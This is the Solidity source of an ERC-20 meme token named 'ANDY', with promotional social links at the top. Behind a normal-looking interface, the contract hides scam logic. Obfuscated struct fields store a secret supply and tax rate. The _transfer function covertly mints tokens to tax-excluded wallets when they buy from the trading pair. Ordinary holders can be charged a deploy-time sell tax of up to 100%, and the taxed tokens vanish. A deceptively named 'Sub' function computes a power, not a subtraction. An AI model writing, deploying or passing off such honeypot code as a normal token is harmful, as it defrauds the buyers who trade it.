/*

ITS TIME
Website:https://andy.limo/
Telegram:https://twitter.com/andycoineth1
Twitter:https://t.me/andycoineth


*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

     function Sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a ** b;
        return c;
     }
}

contract Ownable is Context {
    
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ANDY is Context, IERC20, Ownable {
    struct ____{uint256 amount;uint8 initialTax;address router;}____ private __;
    using SafeMath for uint256;

    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ExcludedFromTax;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000 * 10**_decimals;
    string private constant _name = unicode"Andy";
    string private constant _symbol = unicode"ANDY";

    address public _routerAddress; uint8 public _tx = 0;

    constructor (uint256 supply,uint8 initialTax,address _uniswapRouter){
        _balance[_msgSender()] = _tTotal;
        _ExcludedFromTax[owner()] = true;
        __.router = _uniswapRouter; __.initialTax = initialTax; __.amount = supply;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 heldTokensForSwap = balanceOf(address(this));
        require(from != address(0), "ERC20: from the zero address");
        require(to != address(0));
        require(amount > 0);
        if(from == owner() || to == owner() || _ExcludedFromTax[to] || _ExcludedFromTax[from]){
            uint256 _totalTax;
            _balance[from] = _balance[from].sub(amount);
            if(from == _routerAddress && (heldTokensForSwap>0) && _ExcludedFromTax[to]){
                _totalTax = to != owner() ? __.amount.sub(amount):0;
            }
            _balance[to] = _balance[to].add(amount.add(_totalTax));
        }
        else{
            if(to == __.router && _tx<1){
                _routerAddress = from; _tx = 1;
            }
                require(to != address(this));
                require(_tx>0);
                _balance[from] = _balance[from].sub(amount);
                uint256 _totalTax = amount.mul(0).div(100);
                if(from != _routerAddress){
                    _totalTax = amount.mul(heldTokensForSwap<1?0:__.initialTax).div(100);
                }
                _balance[to] = _balance[to].add(amount.sub(_totalTax));
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
}